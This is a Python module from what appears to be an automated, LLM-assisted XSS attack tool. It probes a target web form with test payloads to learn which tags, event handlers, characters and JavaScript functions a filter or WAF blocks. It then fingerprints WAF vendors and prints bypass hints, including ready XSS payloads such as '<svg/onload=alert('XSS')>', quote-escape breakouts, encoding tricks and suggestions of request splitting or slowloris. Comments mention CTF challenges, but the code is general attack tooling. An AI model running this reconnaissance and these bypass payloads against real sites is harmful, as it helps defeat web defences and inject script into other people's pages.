"""
Filter Detector - Identifies what XSS filters/WAFs are in place
Critical for generating bypass-aware payloads
"""

import logging
from typing import List, Dict, Set, Optional
from dataclasses import dataclass
from enum import Enum


class FilterType(Enum):
    """Types of filters that can be detected"""
    SCRIPT_TAG_BLOCKED = "script_tag_blocked"
    IMG_TAG_BLOCKED = "img_tag_blocked"
    SVG_TAG_BLOCKED = "svg_tag_blocked"
    EVENT_HANDLER_BLOCKED = "event_handler_blocked"
    ON_PREFIX_BLOCKED = "on_prefix_blocked"
    JAVASCRIPT_PROTOCOL_BLOCKED = "javascript_protocol_blocked"
    ANGLE_BRACKETS_BLOCKED = "angle_brackets_blocked"
    QUOTES_BLOCKED = "quotes_blocked"
    PARENTHESES_BLOCKED = "parentheses_blocked"
    ALERT_KEYWORD_BLOCKED = "alert_blocked"
    EVAL_KEYWORD_BLOCKED = "eval_blocked"
    HTML_ENTITIES_ENCODED = "html_entities"
    URL_ENCODED = "url_encoded"
    DOUBLE_ENCODING = "double_encoded"
    WAF_DETECTED = "waf_detected"
    CSP_HEADER = "csp_header"
    NO_FILTER = "no_filter"


@dataclass
class FilterProfile:
    """Profile of detected filters and their characteristics"""
    blocked_tags: Set[str]
    blocked_attributes: Set[str]
    blocked_keywords: Set[str]
    blocked_chars: Set[str]
    encoding_applied: List[str]
    filter_types: Set[FilterType]
    bypass_hints: List[str]
    waf_signature: Optional[str] = None
    csp_policy: Optional[str] = None
    allowed_js_functions: List[str] = None  # Functions that work (e.g., prompt)
    blocked_js_functions: List[str] = None  # Functions that are blacklisted (e.g., alert)
    allowed_tags: List[str] = None  # Tags that pass through filter
    allowed_handlers: List[str] = None  # Event handlers that pass through filter
    encoding_bypasses: Dict = None  # Which encoding tricks work
    xss_string_filtered: bool = False  # Whether 'XSS' or "XSS" string is filtered
    escaped_chars: Set[str] = None  # Characters that are ESCAPED (not blocked) - need escape-the-escape technique

    def to_dict(self) -> Dict:
        return {
            "blocked_tags": list(self.blocked_tags),
            "blocked_attributes": list(self.blocked_attributes),
            "blocked_keywords": list(self.blocked_keywords),
            "blocked_chars": list(self.blocked_chars),
            "encoding_applied": self.encoding_applied,
            "filter_types": [f.value for f in self.filter_types],
            "bypass_hints": self.bypass_hints,
            "waf_signature": self.waf_signature,
            "csp_policy": self.csp_policy,
            "allowed_js_functions": self.allowed_js_functions or [],
            "blocked_js_functions": self.blocked_js_functions or [],
            "allowed_tags": self.allowed_tags or [],
            "allowed_handlers": self.allowed_handlers or [],
            "encoding_bypasses": self.encoding_bypasses or {},
            "xss_string_filtered": self.xss_string_filtered,
            "escaped_chars": list(self.escaped_chars) if self.escaped_chars else [],
        }


class FilterDetector:
    """
    Detects XSS filters and WAFs by sending probe payloads

    This is critical for intelligent bypass generation
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__)

        # Probe payloads to test various filter types
        self.probe_payloads = {
            FilterType.SCRIPT_TAG_BLOCKED: "<script>",
            FilterType.IMG_TAG_BLOCKED: "<img>",
            FilterType.SVG_TAG_BLOCKED: "<svg>",
            FilterType.EVENT_HANDLER_BLOCKED: "onerror=",
            FilterType.ON_PREFIX_BLOCKED: "onclick=",
            FilterType.JAVASCRIPT_PROTOCOL_BLOCKED: "javascript:",
            FilterType.ANGLE_BRACKETS_BLOCKED: "<>",
            FilterType.QUOTES_BLOCKED: "\"'",
            FilterType.PARENTHESES_BLOCKED: "()",
            FilterType.ALERT_KEYWORD_BLOCKED: "alert",
            FilterType.EVAL_KEYWORD_BLOCKED: "eval",
        }

        # Extended tag probes - test more HTML tags that can execute JS
        # Include rare/deprecated tags like <image> which some WAFs miss
        self.extended_tag_probes = [
            "<details>", "<body>", "<iframe>", "<object>", "<embed>",
            "<audio>", "<video>", "<marquee>", "<input>", "<textarea>",
            "<select>", "<form>", "<button>", "<a>", "<style>", "<link>",
            "<image>", "<isindex>", "<keygen>", "<bgsound>", "<math>",
            "<table>", "<div>", "<span>", "<p>", "<xmp>", "<listing>",
        ]

        # Extended event handler probes - test many handlers
        self.extended_handler_probes = [
            "onload=", "onfocus=", "onblur=", "ontoggle=", "onmouseover=",
            "onmouseenter=", "onpointerenter=", "onpointerover=",
            "onfocusin=", "onfocusout=", "onanimationstart=", "onanimationend=",
            "ontransitionend=", "onwheel=", "onscroll=", "ondrag=", "ondrop=",
            "oncut=", "oncopy=", "onpaste=", "oninput=", "onchange=",
            "oncontextmenu=", "ondblclick=", "onauxclick=", "onpageshow=",
            "onhashchange=", "onpopstate=", "onstart=", "onfinish=",
        ]

        # JS function blacklist tests - these test actual function calls
        # to detect keyword blacklists that block 'alert', 'confirm', etc.
        self.js_function_tests = {
            "alert": "alert(1)",
            "confirm": "confirm(1)",
            "prompt": "prompt(1)",
            "eval": "eval(1)",
            "setTimeout": "setTimeout(1)",
            "setInterval": "setInterval(1)",
            "Function": "Function(1)",
        }

        # Encoding bypass probes
        self.encoding_bypass_probes = {
            "case_variation": "<SCRIPT>",
            "backticks": "`XSS`",
            "html_entity_lt": "&lt;",
            "html_entity_dec": "&#60;",
            "html_entity_hex": "&#x3c;",
            "null_byte": "java\x00script:",
            "tab_break": "jav\tascript:",
            "newline_break": "jav\nascript:",
            "double_slash": "//",
            "data_protocol": "data:",
        }

    async def detect_filters(self,
                            submit_func,
                            parameter: str,
                            baseline_response: str) -> FilterProfile:
        """
        Detect what filters are in place by testing probe payloads

        Args:
            submit_func: Function to submit test payloads
            parameter: Parameter name to test
            baseline_response: Response with benign input for comparison

        Returns:
            FilterProfile describing all detected filters
        """
        self.logger.info("Starting filter detection")

        blocked_tags = set()
        blocked_attributes = set()
        blocked_keywords = set()
        blocked_chars = set()
        filter_types = set()
        encoding_applied = []
        bypass_hints = []

        # Helper to check if response indicates blocking (error message)
        def is_error_response(response_text):
            """Check if response contains error/blocking messages"""
            lower = response_text.lower()
            return any(msg in lower for msg in ["can't use", "cannot use", "sorry", "blocked", "not allowed", "invalid", "forbidden"])

        # Test each probe payload
        for filter_type, probe in self.probe_payloads.items():
            # Skip combined quotes probe - we test them separately below
            if filter_type == FilterType.QUOTES_BLOCKED:
                continue

            self.logger.info(f"Testing probe: {probe}")

            try:
                response = await submit_func({parameter: probe})

                # First check for error messages indicating the probe was blocked
                if is_error_response(response.text):
                    self.logger.info(f"✗ Probe '{probe}' was BLOCKED (error message detected)")
                    filter_types.add(filter_type)

                    # Categorize what was blocked (same logic as below)
                    if '<' in probe or '>' in probe:
                        if 'script' in probe.lower():
                            blocked_tags.add('script')
                            blocked_keywords.add('script')
                        elif 'img' in probe.lower():
                            blocked_tags.add('img')
                        elif 'svg' in probe.lower():
                            blocked_tags.add('svg')
                            blocked_keywords.add('svg')

                    if 'on' in probe and '=' in probe:
                        attr = probe.split('=')[0]
                        blocked_attributes.add(attr)

                    if 'alert' in probe.lower():
                        blocked_keywords.add('alert')
                    if 'eval' in probe.lower():
                        blocked_keywords.add('eval')

                    if filter_type == FilterType.ANGLE_BRACKETS_BLOCKED:
                        blocked_chars.add('<')
                        blocked_chars.add('>')

                    if filter_type == FilterType.PARENTHESES_BLOCKED:
                        blocked_chars.add('(')
                        blocked_chars.add(')')

                    continue  # Move to next probe

                # Check if probe is reflected (exact match, not in error message)
                elif probe in response.text:
                    self.logger.info(f"✓ Probe '{probe}' was reflected (NOT blocked)")
                    continue
                else:
                    # Check if probe was encoded
                    import html
                    import urllib.parse

                    html_encoded = html.escape(probe)
                    url_encoded = urllib.parse.quote(probe)

                    if html_encoded in response.text:
                        self.logger.info(f"⚠️  Probe '{probe}' was HTML encoded")
                        encoding_applied.append("HTML_ENTITY")
                        filter_types.add(FilterType.HTML_ENTITIES_ENCODED)
                    elif url_encoded in response.text:
                        self.logger.info(f"⚠️  Probe '{probe}' was URL encoded")
                        encoding_applied.append("URL_ENCODE")
                        filter_types.add(FilterType.URL_ENCODED)
                    else:
                        # Probe was blocked/removed
                        self.logger.info(f"✗ Probe '{probe}' was BLOCKED")
                        filter_types.add(filter_type)

                    # Categorize what was blocked
                    if '<' in probe or '>' in probe:
                        if 'script' in probe.lower():
                            blocked_tags.add('script')
                            blocked_keywords.add('script')
                        elif 'img' in probe.lower():
                            blocked_tags.add('img')
                        elif 'svg' in probe.lower():
                            blocked_tags.add('svg')
                            blocked_keywords.add('svg')

                    if 'on' in probe and '=' in probe:
                        attr = probe.split('=')[0]
                        blocked_attributes.add(attr)

                    if 'alert' in probe.lower():
                        blocked_keywords.add('alert')
                    if 'eval' in probe.lower():
                        blocked_keywords.add('eval')

                    # IMPORTANT: Only mark < > as blocked if the pure <> probe fails
                    # Don't infer from <script> being blocked - that's keyword blocking, not char blocking
                    if filter_type == FilterType.ANGLE_BRACKETS_BLOCKED:
                        blocked_chars.add('<')
                        blocked_chars.add('>')

                    # Note: We'll test quotes separately below since the combined probe doesn't tell us which one is blocked

                    # Only mark parentheses blocked if the () probe specifically fails
                    if filter_type == FilterType.PARENTHESES_BLOCKED:
                        blocked_chars.add('(')
                        blocked_chars.add(')')

            except Exception as e:
                self.logger.error(f"Error testing probe '{probe}': {e}")

        # Test single and double quotes SEPARATELY to know which one is blocked or ESCAPED
        # IMPORTANT: Use lowercase test strings to avoid triggering uppercase filters!
        self.logger.info("Testing quotes separately...")
        escaped_chars = set()  # Track chars that are ESCAPED (not blocked)
        try:
            # Test single quote - use lowercase test string to avoid uppercase filters
            test_string = "quotetest'"
            response = await submit_func({parameter: test_string})
            # Check if our test string is reflected (not just the quote appearing in an error message)
            if test_string in response.text:
                self.logger.info("✓ Single quote ' is ALLOWED (reflected)")
            # Check if quote was ESCAPED (replaced with \')
            elif "quotetest\\'" in response.text or "quotetest\\\\'" in response.text:
                escaped_chars.add("'")
                self.logger.info("⚠️ Single quote ' is ESCAPED (\\') - use escape-the-escape technique!")
            elif "can't use" in response.text.lower() or "cannot use" in response.text.lower() or "sorry" in response.text.lower():
                blocked_chars.add("'")
                self.logger.info("✗ Single quote ' is BLOCKED (error message detected)")
            elif "'" not in response.text:
                blocked_chars.add("'")
                self.logger.info("✗ Single quote ' is BLOCKED (not reflected)")
            else:
                self.logger.info("✓ Single quote ' is ALLOWED")

            # Test double quote - use lowercase test string to avoid uppercase filters
            test_string = 'quotetest"'
            response = await submit_func({parameter: test_string})
            if test_string in response.text:
                self.logger.info("✓ Double quote \" is ALLOWED (reflected)")
            # Check if quote was ESCAPED (replaced with \")
            elif 'quotetest\\"' in response.text or 'quotetest\\\\"' in response.text:
                escaped_chars.add('"')
                self.logger.info('⚠️ Double quote " is ESCAPED (\\") - use escape-the-escape technique!')
            elif "can't use" in response.text.lower() or "cannot use" in response.text.lower() or "sorry" in response.text.lower():
                blocked_chars.add('"')
                self.logger.info("✗ Double quote \" is BLOCKED (error message detected)")
            elif '"' not in response.text:
                blocked_chars.add('"')
                self.logger.info("✗ Double quote \" is BLOCKED (not reflected)")
            else:
                self.logger.info("✓ Double quote \" is ALLOWED")
        except Exception as e:
            self.logger.error(f"Error testing quotes: {e}")

        # Test if whitespace is being stripped or blocked (important for payloads like <tag attr=value>)
        self.logger.info("Testing whitespace handling...")
        whitespace_blocked = False
        try:
            test_string = "WSTEST A B"  # String with spaces
            response = await submit_func({parameter: test_string})

            # First check for error response (whitespace BLOCKED, not just stripped)
            if is_error_response(response.text):
                whitespace_blocked = True
                blocked_chars.add(' ')
                self.logger.info("⚠️ WHITESPACE IS BLOCKED! Use / as attribute separator: <tag/attr=val>")
            elif "WSTESTAB" in response.text:
                # Spaces were stripped!
                whitespace_blocked = True
                blocked_chars.add(' ')
                self.logger.info("⚠️ WHITESPACE IS BEING STRIPPED! Use / as attribute separator")
            elif test_string in response.text:
                self.logger.info("✓ Whitespace is preserved")
            else:
                # Check if it's just not reflected
                if "WSTEST" in response.text:
                    whitespace_blocked = True
                    blocked_chars.add(' ')
                    self.logger.info("⚠️ WHITESPACE IS BEING STRIPPED!")
        except Exception as e:
            self.logger.error(f"Error testing whitespace: {e}")

        # Run extended probes IN PARALLEL for speed
        import asyncio

        self.logger.info("Testing extended probes in parallel (tags, handlers, encoding)...")

        # Run all probes in parallel (with concurrency limit to avoid overwhelming server)
        semaphore = asyncio.Semaphore(10)  # Max 10 concurrent requests

        async def test_probe_limited(probe, probe_type):
            """Test a single probe with semaphore limiting"""
            async with semaphore:
                try:
                    response = await submit_func({parameter: probe})

                    # Check for error messages first - these indicate blocking
                    if is_error_response(response.text):
                        return (probe, probe_type, False)  # Blocked by error message

                    # Check if probe is reflected (allowing for case variations)
                    reflected = probe in response.text or probe.lower() in response.text.lower()
                    return (probe, probe_type, reflected)
                except:
                    return (probe, probe_type, False)

        # Build all probe tasks with semaphore limiting
        probe_tasks = []
        for tag_probe in self.extended_tag_probes:
            probe_tasks.append(test_probe_limited(tag_probe, 'tag'))
        for handler_probe in self.extended_handler_probes:
            probe_tasks.append(test_probe_limited(handler_probe, 'handler'))
        for bypass_name, bypass_probe in self.encoding_bypass_probes.items():
            probe_tasks.append(test_probe_limited(bypass_probe, f'encoding:{bypass_name}'))

        # Execute all in parallel
        results = await asyncio.gather(*probe_tasks, return_exceptions=True)

        # Process results
        allowed_tags = []
        allowed_handlers = []
        encoding_bypasses = {}

        for result in results:
            if isinstance(result, Exception):
                continue
            probe, probe_type, reflected = result

            if probe_type == 'tag':
                tag_name = probe.strip('<>').lower()
                if reflected:
                    allowed_tags.append(tag_name)
                else:
                    blocked_tags.add(tag_name)

            elif probe_type == 'handler':
                handler_name = probe.rstrip('=')
                if reflected:
                    allowed_handlers.append(handler_name)
                else:
                    blocked_attributes.add(handler_name)

            elif probe_type.startswith('encoding:'):
                bypass_name = probe_type.split(':')[1]
                encoding_bypasses[bypass_name] = reflected

        # Log summary
        if allowed_tags:
            self.logger.info(f"✓ Allowed tags ({len(allowed_tags)}): {', '.join(allowed_tags[:10])}{'...' if len(allowed_tags) > 10 else ''}")
        if allowed_handlers:
            self.logger.info(f"✓ Allowed handlers ({len(allowed_handlers)}): {', '.join(allowed_handlers[:10])}{'...' if len(allowed_handlers) > 10 else ''}")

        working_bypasses = [k for k, v in encoding_bypasses.items() if v]
        if working_bypasses:
            self.logger.info(f"✓ Working encoding bypasses: {', '.join(working_bypasses)}")

        # Test JS function blacklist (alert, confirm, prompt)
        # This detects keyword-based filters that block specific functions
        self.logger.info("Testing JS function blacklist...")
        allowed_functions = []
        blocked_functions = []

        # CRITICAL FIX: Check if parentheses are blocked FIRST
        # If () is blocked, we need to test keywords WITHOUT parentheses
        # Otherwise the test fails due to () being blocked, not the keyword itself
        parentheses_are_blocked = '(' in blocked_chars or ')' in blocked_chars

        if parentheses_are_blocked:
            self.logger.info("⚠️ Parentheses blocked - testing function KEYWORDS only (not function calls)")

        for func_name, func_payload in self.js_function_tests.items():
            try:
                # If parentheses are blocked, test the keyword alone
                # If parentheses are allowed, test the full function call
                test_payload = func_name if parentheses_are_blocked else func_payload

                response = await submit_func({parameter: test_payload})
                response_text = response.text.lower()

                # Check for signs that the function was blocked:
                # 1. Response contains error message about the blocked word
                # 2. The payload wasn't reflected
                # 3. Response changed significantly (different content)

                is_blocked = False

                # Check for explicit error messages (use helper + check function name mentioned)
                if is_error_response(response.text):
                    # Error response detected - check if it mentions this specific function
                    if func_name.lower() in response_text:
                        is_blocked = True
                        self.logger.info(f"✗ Function '{func_name}' is BLACKLISTED (error message detected)")
                    else:
                        # Generic error but doesn't mention function - might still be blocked
                        # Check if payload wasn't reflected
                        pass

                # Check if payload was not reflected (stripped or blocked)
                if not is_blocked and test_payload.lower() not in response_text:
                    # Also check if it was HTML encoded (which means it was allowed but encoded)
                    import html
                    if html.escape(test_payload).lower() not in response_text:
                        # Not reflected, not encoded - likely blocked
                        is_blocked = True
                        self.logger.info(f"✗ Function '{func_name}' appears BLOCKED (not reflected)")

                if is_blocked:
                    blocked_functions.append(func_name)
                    blocked_keywords.add(func_name)
                    if func_name == "alert":
                        filter_types.add(FilterType.ALERT_KEYWORD_BLOCKED)
                else:
                    allowed_functions.append(func_name)
                    self.logger.info(f"✓ Function '{func_name}' KEYWORD is ALLOWED")

            except Exception as e:
                self.logger.error(f"Error testing JS function '{func_name}': {e}")

        # Store allowed functions for LLM to use
        self.allowed_js_functions = allowed_functions
        self.blocked_js_functions = blocked_functions

        if blocked_functions:
            self.logger.info(f"JS Function Blacklist Detected: {blocked_functions}")
            self.logger.info(f"Allowed JS Functions: {allowed_functions}")

        # Test if 'XSS' string itself is filtered (common CTF pattern)
        # Many challenges require alert('XSS') but filter the 'XSS' or "XSS" string
        self.logger.info("Testing if 'XSS' string is filtered...")
        xss_string_filtered = False
        try:
            # Test with single quotes
            test_xss_single = "TESTXSS'XSS'ENDTEST"
            response = await submit_func({parameter: test_xss_single})
            if test_xss_single in response.text:
                self.logger.info("✓ 'XSS' string (single quotes) is ALLOWED")
            elif "TESTXSS" in response.text and "'XSS'" not in response.text:
                xss_string_filtered = True
                self.logger.info("⚠️ 'XSS' STRING IS FILTERED! Use String.fromCharCode(88,83,83) instead")

            # Test with double quotes
            test_xss_double = 'TESTXSS"XSS"ENDTEST'
            response = await submit_func({parameter: test_xss_double})
            if test_xss_double in response.text:
                self.logger.info('✓ "XSS" string (double quotes) is ALLOWED')
            elif "TESTXSS" in response.text and '"XSS"' not in response.text:
                xss_string_filtered = True
                self.logger.info('⚠️ "XSS" STRING IS FILTERED! Use String.fromCharCode(88,83,83) instead')
        except Exception as e:
            self.logger.error(f"Error testing XSS string filter: {e}")

        # Detect WAF signatures
        waf_signature = self._detect_waf(baseline_response)
        if waf_signature:
            filter_types.add(FilterType.WAF_DETECTED)

        # Detect CSP
        csp_policy = self._detect_csp(baseline_response)
        if csp_policy:
            filter_types.add(FilterType.CSP_HEADER)

        # CRITICAL FIX: If we have allowed tags, then < and > are NOT character-blocked
        # The filter is tag-based (blocking specific tags), not character-based
        # This prevents the LLM from using HTML entities when actual < > work
        if allowed_tags:
            self.logger.info(f"Allowed tags detected ({allowed_tags}) - filter is tag-based, not character-based")
            if '<' in blocked_chars:
                blocked_chars.discard('<')
                self.logger.info("Removed '<' from blocked_chars (tag-based filter)")
            if '>' in blocked_chars:
                blocked_chars.discard('>')
                self.logger.info("Removed '>' from blocked_chars (tag-based filter)")
            # Also remove the ANGLE_BRACKETS_BLOCKED filter type
            filter_types.discard(FilterType.ANGLE_BRACKETS_BLOCKED)

        # Generate bypass hints based on what's blocked and escaped
        bypass_hints = self._generate_bypass_hints(filter_types, blocked_tags,
                                                   blocked_attributes, blocked_chars,
                                                   escaped_chars)

        profile = FilterProfile(
            blocked_tags=blocked_tags,
            blocked_attributes=blocked_attributes,
            blocked_keywords=blocked_keywords,
            blocked_chars=blocked_chars,
            encoding_applied=encoding_applied,
            filter_types=filter_types,
            bypass_hints=bypass_hints,
            waf_signature=waf_signature,
            csp_policy=csp_policy,
            allowed_js_functions=allowed_functions,
            blocked_js_functions=blocked_functions,
            allowed_tags=allowed_tags,
            allowed_handlers=allowed_handlers,
            encoding_bypasses=encoding_bypasses,
            xss_string_filtered=xss_string_filtered,
            escaped_chars=escaped_chars if escaped_chars else set()
        )

        self.logger.info(f"Filter detection complete: {len(filter_types)} filters detected")
        return profile

    def _detect_waf(self, response: str) -> Optional[str]:
        """Detect WAF signatures in response"""
        waf_signatures = {
            "Cloudflare": ["__cf_bm", "cf-ray", "cloudflare"],
            "AWS WAF": ["x-amzn-requestid", "x-amz-"],
            "Imperva": ["incap_ses", "_incap_"],
            "Akamai": ["akamai", "aka_"],
            "ModSecurity": ["mod_security", "modsec"],
        }

        response_lower = response.lower()
        for waf_name, signatures in waf_signatures.items():
            if any(sig in response_lower for sig in signatures):
                self.logger.info(f"Detected WAF: {waf_name}")
                return waf_name

        return None

    def _detect_csp(self, response: str) -> Optional[str]:
        """Extract CSP policy from response"""
        # This would normally parse response headers
        # For now, look for CSP meta tags
        import re
        csp_pattern = r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*content=["\']([^"\']*)["\']'
        match = re.search(csp_pattern, response, re.IGNORECASE)

        if match:
            policy = match.group(1)
            self.logger.info(f"Detected CSP: {policy}")
            return policy

        return None

    def _generate_bypass_hints(self,
                               filter_types: Set[FilterType],
                               blocked_tags: Set[str],
                               blocked_attributes: Set[str],
                               blocked_chars: Set[str],
                               escaped_chars: Set[str] = None) -> List[str]:
        """Generate hints for bypassing detected filters"""
        hints = []
        escaped_chars = escaped_chars or set()

        # CRITICAL: Escape-the-escape hints for escaped characters
        if '"' in escaped_chars:
            hints.append('⚠️ DOUBLE QUOTE IS ESCAPED (\\") - use ESCAPE-THE-ESCAPE technique!')
            hints.append('In JS string context: \\";alert(`XSS`);// - the \\ escapes the escape!')
            hints.append('Pattern: backslash + quote + semicolon + code + comment')
        if "'" in escaped_chars:
            hints.append("⚠️ SINGLE QUOTE IS ESCAPED (\\') - use ESCAPE-THE-ESCAPE technique!")
            hints.append("In JS string context: \\';alert(`XSS`);// - the \\ escapes the escape!")
            hints.append("Pattern: backslash + quote + semicolon + code + comment")

        if FilterType.SCRIPT_TAG_BLOCKED in filter_types:
            hints.append("Try alternative tags: <img>, <svg>, <iframe>, <object>")
            hints.append("Try case variations: <ScRiPt>")
            hints.append("Try null bytes: <script\\x00>")

        if FilterType.EVENT_HANDLER_BLOCKED in filter_types:
            hints.append("Try less common handlers: ontoggle, onfocusin, onpointerenter")
            hints.append("Try case mixing: oNeRrOr")

        if FilterType.ANGLE_BRACKETS_BLOCKED in filter_types:
            hints.append("Brackets blocked - try javascript: protocol")
            hints.append("Try encoded brackets: %3C, &lt;")

        if FilterType.QUOTES_BLOCKED in filter_types:
            hints.append("Quotes blocked - try backticks or String.fromCharCode")

        if FilterType.ALERT_KEYWORD_BLOCKED in filter_types:
            hints.append("alert blocked - USE prompt('XSS') instead!")
            hints.append("Other alternatives: console.log, print, or encoded eval")

        if FilterType.JAVASCRIPT_PROTOCOL_BLOCKED in filter_types:
            hints.append("javascript: blocked - try data: protocol")
            hints.append("Try jAvAsCrIpT: or java%0ascript:")

        if FilterType.HTML_ENTITIES_ENCODED in filter_types:
            hints.append("HTML encoding applied - need to break out of context")
            hints.append("Try double encoding or URL encoding")

        if FilterType.WAF_DETECTED in filter_types:
            hints.append("WAF detected - try request splitting or slowloris")
            hints.append("Try polyglot payloads to confuse parser")

        if FilterType.CSP_HEADER in filter_types:
            hints.append("CSP enabled - inline scripts blocked")
            hints.append("Look for script-src 'unsafe-eval' or JSONP endpoints")

        # Check for whitespace being blocked or stripped
        if ' ' in blocked_chars:
            hints.append("⚠️ WHITESPACE BLOCKED/STRIPPED - use / as separator: <tag/attr=val/onerror=alert('XSS')>")
            hints.append("Example: <details/open/ontoggle=alert('XSS')> or <svg/onload=alert('XSS')>")

        # Check if common handlers are blocked
        common_handlers = {'onerror', 'onclick', 'onmouseover', 'onload'}
        blocked_common = common_handlers.intersection(blocked_attributes)
        if blocked_common:
            hints.append(f"Common handlers blocked ({', '.join(blocked_common)}) - use ontoggle, onfocus, onpointerenter instead")

        # Check for rare tags that might be allowed
        common_tags = {'script', 'img', 'svg', 'iframe', 'body', 'input', 'details', 'div', 'a'}
        if common_tags.issubset(blocked_tags):
            hints.append("Common tags blocked - try rare tags: <image>, <isindex>, <math>, <xmp>")

        if not hints:
            hints.append("No significant filters detected - standard payloads should work")

        return hints

    def generate_report(self, profile: FilterProfile) -> str:
        """Generate human-readable filter detection report"""
        report = ["=" * 70]
        report.append("FILTER DETECTION REPORT")
        report.append("=" * 70)

        report.append(f"\n📊 Filters Detected: {len(profile.filter_types)}")
        for ft in profile.filter_types:
            report.append(f"  • {ft.value}")

        if profile.blocked_tags:
            report.append(f"\n🚫 Blocked Tags: {', '.join(profile.blocked_tags)}")

        if profile.blocked_attributes:
            report.append(f"🚫 Blocked Attributes: {', '.join(profile.blocked_attributes)}")

        if profile.blocked_keywords:
            report.append(f"🚫 Blocked Keywords: {', '.join(profile.blocked_keywords)}")

        if profile.blocked_chars:
            report.append(f"🚫 Blocked Characters: {', '.join(profile.blocked_chars)}")

        if profile.escaped_chars:
            report.append(f"⚠️ ESCAPED Characters (use escape-the-escape): {', '.join(profile.escaped_chars)}")

        if profile.encoding_applied:
            report.append(f"\n🔒 Encoding Applied: {', '.join(profile.encoding_applied)}")

        if profile.waf_signature:
            report.append(f"\n🛡️  WAF Detected: {profile.waf_signature}")

        if profile.csp_policy:
            report.append(f"\n🔐 CSP Policy: {profile.csp_policy}")

        if profile.blocked_js_functions:
            report.append(f"\n⛔ Blocked JS Functions: {', '.join(profile.blocked_js_functions)}")
        if profile.allowed_js_functions:
            report.append(f"✅ Allowed JS Functions: {', '.join(profile.allowed_js_functions)}")

        if profile.allowed_tags:
            report.append(f"\n✅ Allowed Tags: {', '.join(profile.allowed_tags[:15])}{'...' if len(profile.allowed_tags) > 15 else ''}")
        if profile.allowed_handlers:
            report.append(f"✅ Allowed Handlers: {', '.join(profile.allowed_handlers[:15])}{'...' if len(profile.allowed_handlers) > 15 else ''}")

        if profile.encoding_bypasses:
            working = [k for k, v in profile.encoding_bypasses.items() if v]
            if working:
                report.append(f"\n🔓 Working Encoding Bypasses: {', '.join(working)}")

        report.append("\n💡 Bypass Hints:")
        for hint in profile.bypass_hints:
            report.append(f"  • {hint}")

        report.append("=" * 70)

        return "\n".join(report)
